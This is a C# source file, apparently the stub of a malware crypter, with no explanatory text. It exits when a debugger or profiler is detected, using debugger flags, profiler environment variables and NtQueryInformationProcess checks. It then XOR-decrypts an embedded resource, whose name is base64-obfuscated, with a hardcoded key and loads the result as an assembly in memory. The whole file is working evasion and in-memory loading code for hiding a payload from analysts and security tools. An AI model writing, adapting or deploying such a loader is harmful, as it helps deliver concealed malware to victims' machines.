using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using System.Threading.Tasks;

namespace Core.Injection
{
    class Resource
    {
        [DllImport("ntdll.dll", CharSet = CharSet.Auto)]
        public static extern int NtQueryInformationProcess(IntPtr test, int test2, int[] test3, int test4, ref int test5);

        private static byte[] array;

        public static void setup()
        {
            if (Debugger.IsLogging() || Debugger.IsAttached || Environment.GetEnvironmentVariable("complus_profapi_profilercompatibilitysetting") != null || string.Compare(Environment.GetEnvironmentVariable("COR_ENABLE_PROFILING"), "1", StringComparison.Ordinal) == 0)
            {
                Environment.Exit(0); 
            }
            var arrayz = new int[6];
            var num = 0;
            if (NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 31, arrayz, 4, ref num) == 0 && arrayz[0] != 1 || NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 30, arrayz, 4, ref num) == 0 && arrayz[0] != 0)
            {
                Environment.Exit(0);
            }
            byte[] passbytes = Encoding.ASCII.GetBytes(@"wMeowKey");
            using (Stream stream = Assembly.GetCallingAssembly().GetManifestResourceStream(Encoding.UTF8.GetString(Convert.FromBase64String("KyEkIyU=")))) //+!$#%
            using (StreamReader reader = new StreamReader(stream))
            {

                array = new byte[stream.Length];
                stream.Read(array, 0, array.Length); 
                for (int i = 0; i < array.Length; i++)
                {
                    array[i] = (byte)(passbytes[i % passbytes.Length] ^ array[i]);
                }
            }
            AppDomain.CurrentDomain.AssemblyResolve += ResolveAssembly;
        }
        public static Assembly ResolveAssembly(Object sender, ResolveEventArgs e)
        {

            return e.Name.Contains("Runtime") ? Assembly.Load(array) : null;

        }
    }
}
